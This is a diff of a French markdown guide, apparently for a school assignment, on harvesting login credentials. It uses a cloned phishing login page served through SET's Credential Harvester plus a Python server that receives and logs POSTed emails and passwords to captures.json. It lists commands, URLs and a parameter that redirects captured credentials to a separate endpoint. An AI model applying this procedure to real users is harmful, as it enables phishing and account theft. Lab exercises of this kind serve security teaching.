@@ -1,37 +1,58 @@
-# Guide SET + page de connexion
+# Capture des identifiants (sans dependre du terminal SET)
 
-## Pourquoi SET ne voit rien
+SET sur le port **80** n'affiche souvent qu'un `GET /` car la page envoie les donnees ailleurs.
+Utilise ton **serveur Python** sur le port **8765** pour recevoir le POST.
 
-| URL testée | Ce qui se passe |
-|------------|-----------------|
-| `https://bmouchet04.github.io/Test/login-simulation.html` | La page est sur **GitHub**, pas sur SET. Aucune donnée dans le terminal SET. |
-| `http://localhost:8765/...` + `python server.py` | Enregistrement **JSON** vers ton serveur Python. SET (port **80**) ne reçoit rien. |
-| `http://172.17.216.224/` (IP SET, port **80**) | **C'est la bonne URL** pour le harvester. |
+## Methode recommandee (simple)
 
-Les requêtes JSON `{email, password, date}` viennent du mode **python server.py**, pas de SET.
+**Terminal 1 :**
+```powershell
+cd c:\Users\benja\Desktop\Perso\bruteforce\Test
+python server.py
+```
 
-## Procédure correcte
+**Navigateur :**
+```
+http://127.0.0.1:8765/login-simulation.html
+```
 
-1. **Arrêter** `python server.py` (libère le port si besoin, évite la confusion).
-2. Lancer SET → Credential Harvester → cloner :
-   `https://bmouchet04.github.io/Test/login-simulation.html`
-3. **Pousser** la dernière version de `login-simulation.html` sur GitHub avant de cloner.
-4. Ouvrir dans le navigateur : **`http://172.17.216.224/`** (ton IP SET), **pas** l'URL GitHub.
-5. Parcours : e-mail → Suivant → mot de passe → Suivant.
-6. Dans le terminal SET, tu dois voir un **POST /** avec `username` et `password`.
+Parcours : e-mail -> Suivant -> mot de passe -> Suivant.
 
-## Champs reconnus par SET
+Tu dois voir dans le terminal :
+```text
+[CAPTURE] test@eleve.fr / motdepasse123 (depuis 127.0.0.1)
+```
 
-- `username` = e-mail saisi
-- `password` = mot de passe
+Et dans `captures.json`.
 
-Formulaire HTML : `method="POST"` `action="/"`.
+## Avec SET + serveur Python (2 terminaux)
 
-## Test local sans SET
+**Terminal 1 — SET** (port 80, clone GitHub)
 
+**Terminal 2 :**
 ```powershell
 python server.py
 ```
 
-Ouvrir : `http://localhost:8765/login-simulation.html`  
-→ enregistrement JSON dans `captures.json` puis redirection Google.
+1. Pousser la derniere `login-simulation.html` sur GitHub
+2. SET clone : `https://bmouchet04.github.io/Test/login-simulation.html`
+3. Ouvrir : `http://127.0.0.1/` ou `http://172.17.216.224/` (page SET, port 80)
+4. Le POST part automatiquement vers `http://172.17.216.224:8765/api/enregistrer`
+
+SET peut n'afficher que `GET /` — c'est normal. Les identifiants sont dans le terminal **python server.py** et `captures.json`.
+
+## Forcer l'URL de l'API
+
+```
+http://172.17.216.224/?api=http://172.17.216.224:8765/api/enregistrer
+```
+
+## Ne pas confondre
+
+| URL | Resultat |
+|-----|----------|
+| GitHub Pages seul | POST vers `:8765` echoue si le serveur Python n'est pas lance |
+| `localhost:8765` | Fonctionne directement |
+| SET port 80 + `python server.py` | POST vers 8765, capture OK |
+
+Utilise uniquement des identifiants **fictifs** pour le devoir.
